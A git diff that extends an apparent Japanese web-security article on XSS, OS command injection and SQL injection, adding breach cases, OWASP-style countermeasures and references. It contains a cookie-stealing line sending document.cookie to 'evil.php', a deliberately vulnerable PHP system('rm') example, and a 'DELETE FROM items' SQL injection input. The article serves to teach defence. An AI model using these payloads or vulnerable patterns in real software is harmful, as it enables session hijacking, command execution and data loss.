@@ -67,6 +67,10 @@ var adr = '../evil.php?cakemonster=' + escape(document.cookie);
 
 後は攻撃者は抜き取ったCookieに格納されているセッション情報などを使用して、被害者になりすますことが可能となる。
 
+実際に発生した被害内容と事例は以下にまとめられており、DOMにアクセスしてWebサイトを改ざんしたり、ユーザアカウントのハイジャックなどが発生している。
+
+- [クロスサイトスクリプティングの被害内容と事例](https://securitynavi.jp/7503)
+
 #### どのような対策を講じるべきか
 
 **Stored XSS** と **Refrected XSS** に関しては、サーバ側でユーザ入力に対して適切な検証処理とエンコーディングを実装することで対処することができる。
@@ -95,18 +99,210 @@ var adr = '../evil.php?cakemonster=' + escape(document.cookie);
 
 #### どういった脆弱性なのか
 
+**コマンドインジェクション** とは、脆弱性のあるWebアプリケーションに対して、入力Formなどを利用してホストOSの任意のコマンドを実行する攻撃である。
+
+この攻撃は、ユーザの入力する値をシステムのシェルに渡すことで可能となる。
+
+例えば以下のようなPHPコードでは、ユーザが入力したファイル名をそのまま `rm` コマンドの引数に渡しているが、Linuxでの パイプ（`|`）などを使って自由に他のOSコマンドを実行することができる。
+
+
+```php
+<?php
+
+print(“Please specify the name of the file to delete”);
+print(“<p>”); 
+
+$file=$_GET[‘filename’];
+system(“rm $file”); 
+
+?>
+```
+
 #### どういった被害が発生しているのか
 
+実際に大量の個人情報が盗まれてしまう被害が発生している。
+
+- [日テレで43万件の個人情報流出--攻撃に使われた「OSコマンドインジェクション」とは？](https://japan.cnet.com/article/35081677/)
+- [J-WAVE、コマンドインジェクション攻撃による不正アクセス、個人情報64万件が流出した恐れ](https://internet.watch.impress.co.jp/docs/news/754885.html)
+
 #### どのような対策を講じるべきか
+
+基本的にはユーザが入力した値に対して正しい検証処理を実行すれば問題ない。
+
+また実装したい機能を実現するために、OSコマンドではなく使用している言語で提供されているAPIを極力使用するようにする。
+
+例えば Java では、メール送信時に `Runtime.exec()` で実装するよりも、`javax.mail.*` で提供されているライブラリを使用するほうが安全である。
+
+#### 参考資料
+
+- [Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
+- [CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')](https://cwe.mitre.org/data/definitions/77.html)
+- [CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)
 
 ### SQLインジェクション
 
-
 #### どういった脆弱性なのか
+
+**SQLインジェクション** とは、脆弱性のあるWebアプリケーションへの入力データを介して、SQLクエリを注入することで、データベースから機密情報を抽出したり、データの中身の変更したり、データベース管理操作の実行したりする攻撃である。
+
+信頼されていないソースからプログラムに対して入力データをそのまま注入したり、SQLクエリを動的に構築する際によく発生する。
+
+主に以下のような被害が発生しうる。
+
+- 機密性の漏洩
+  - データベースには機密情報が満載である
+  - SQLインジェクションで盗まれると被害が大きい
+- 認証
+  - 十分な対策が施されていないSQLクエリを使ってユーザ名とパスワードを検証する
+  - SQLインジェクションにより、パスワードを知らなくても他のユーザとしてシステムにアクセスされてしまう
+- 認可
+  - 認可情報がデータベースに格納されている場合、SQLインジェクションでこの情報を改変されてしまう可能性がある
+- 完全性
+  - SQLインジェクションにより、情報を改変したり削除されてしまう可能性がある
+
+具体的にどのように攻撃が行われるのか考えるために、以下の `C#` のコードを例に攻撃例を考える。
+
+```c#
+string userName = ctx.getAuthenticatedUserName();
+string query = "SELECT * FROM items WHERE owner = "'"
+                + userName + "' AND itemname = '"
+                + ItemName.Text + "'";
+sda = new SqlDataAdapter(query, conn);
+DataTable dt = new DataTable();
+sda.Fill(dt);
+```
+
+上記のように入力値をそのままSQLクエリに挿入するような場合、SQL文を途中で終了させるような入力値を選択することで、データベースに対して攻撃を仕掛けることができる。
+
+例えば以下の入力を行う。
+
+```c#
+userName = hacker
+ItemName = "name'); DELETE FROM items; --"
+```
+
+こうすると最終的に実行されるSQLクエリは以下の形式になる。
+
+```sql
+SELECT * FROM items
+WHERE owner = 'hacker'
+AND itemname = 'name';
+
+DELETE FROM items;
+
+--'
+```
+
+これで攻撃者は `items` テーブルを削除することが可能となる。
 
 #### どういった被害が発生しているのか
 
+SQLインジェクションによって様々な被害が発生している。
+
+以下がその具体例である。
+
+- PlayStation Network
+  - ソニーグループに対する標的型攻撃と考えられている
+  - 漏えいした情報は、氏名、住所、Eメールアドレス、生年月日、パスワード、オンラインID、購入履歴、請求先住所、パスワード再設定用のデータ、サブアカウントなど、多岐にわたる
+- シャトレーゼ
+  - SQLインジェクションにより、ユーザーIDと暗号化しているパスワード、メールアドレス、電話番号、誕生日を含む、20万9999件分の情報が流出した
+  - シャトレーゼはWebサイトを停止する自体となった
+- Ubuntuのフォーラムサイト
+  - フォーラムサイトが悪用され、200万人の情報が流出した
+  - フォーラムのデータベースサーバに特定のSQLを挿入されてしまい、全てのテーブルが読み込まれるという状況であった。
+
 #### どのような対策を講じるべきか
+
+SQLインジェクションは、開発者がユーザからの入力を使用して動的なSQLクエリを構築した際に発生する。開発者は攻撃を回避するために、主に以下の2つの対策を行えばいい。
+
+1. 動的なクエリの書き込みをやめる
+2. ユーザから入力された値がSQLのロジックを変えないようにする
+
+では実際に上記の2つを実践するためのテクニックを紹介していく。
+
+---
+
+1つ目は、**Prepared Statements** の利用である。
+
+これは特定のプログラミング言語が提供しているAPIに従って、ユーザの入力値をSQLクエリに反映する方法である。
+
+開発者は最初にSQLクエリの構造を決定した後で、入力値をパラメータとして渡すため、SQLインジェクションにより、SQLクエリ自体の構造が変化することがない。
+
+例えば `Java` の場合は以下のようにSQLクエリに対してパラメータを挿入する。
+
+```java
+// This should REALLY be validated too
+String custname = request.getParameter("customerName");
+// Perform input validation to detect attacks
+String query = "SELECT account_balance FROM user_data WHERE user_name = ? ";
+PreparedStatement pstmt = connection.prepareStatement( query );
+pstmt.setString( 1, custname);
+ResultSet results = pstmt.executeQuery( );
+```
+
+上記のコード中の `custname` には `'1'='1` などの入力が渡されても、そのまま全体を文字列として挿入し、挿入した文字列にマッチするユーザ名を検索することになる。
+
+---
+
+2つ目は、**ストアドプロシージャ** を使用する。
+
+ストアドプロシージャは常にSQLインジェクションを防ぐことができるとは限らない。
+
+しかし、ほとんどのストアドプロシージャで標準的に提供されているパラメータ化クエリを、安全に実装すればSQLインジェクションを防ぐことができる。
+
+Prepared Statements との違いは、ストアドプロシージャは定義されたSQLコード自体がデータベースに格納されて、アプリケーションから呼び出される形で使用することである。
+
+例えば `Java` では、以下のようにストアドプロシージャを使用する。
+
+```java
+// This should REALLY be validated
+String custname = request.getParameter("customerName");
+try {
+  CallableStatement cs = connection.prepareCall("{call sp_getAccountBalance(?)}");
+  cs.setString(1, custname);
+  ResultSet results = cs.executeQuery();
+  // … result set handling
+} catch (SQLException se) {
+  // … logging and error handling
+}
+```
+
+---
+
+3つ目は、ホワイトリスト形式で **ユーザの入力を検証** する方法である。
+
+これはユーザからの入力値をそのまま動的にSQLクエリに挿入するのではなく、例えば入力値をホワイトリストで許可されている内容なのか検証したりと、何かしらも検証処理を行った後でSQLクエリに挿入する方法である。
+
+例えばテーブル名に関しては、以下のように事前に定義されたものだけを動的SQLクエリに挿入するようにしている。
+
+```java
+String tableName;
+switch(PARAM):
+  case "Value1": tableName = "fooTable";
+                 break;
+  case "Value2": tableName = "barTable";
+                 break;
+  ...
+  default      : throw new InputValidationException("unexpected value provided"
+                                                  + " for table name");
+```
+
+
+---
+
+4つ目は、ユーザからの入力をエスケープ処理するようにする。
+
+これはあくまでも上記の3つの対策がどれも実行できない場合に使用するものである。
+
+各DBMS]は特定の種類のクエリに固有の1つ以上の文字エスケープをサポートしており、適切なエスケープを実行すればDBMSはSQLコード自体とパラメータを混同しないため、SQLインジェクションを防ぐことができる。
+
+#### 参考資料
+
+- [[OWASP] SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
+- [[OWASP] SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
+- [[OWASP] Query Parameterization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html)
+- [被害は7700万人分の個人情報。悪名高き攻撃「SQLインジェクション」への対策方法とは？](https://style.potepan.com/articles/11125.html)
+- [SQLインジェクションとは？被害事例と対策方法5つ！](https://wpmake.jp/contents/security/sql-injection/#SQL-3)
 
 ### CSRF
 
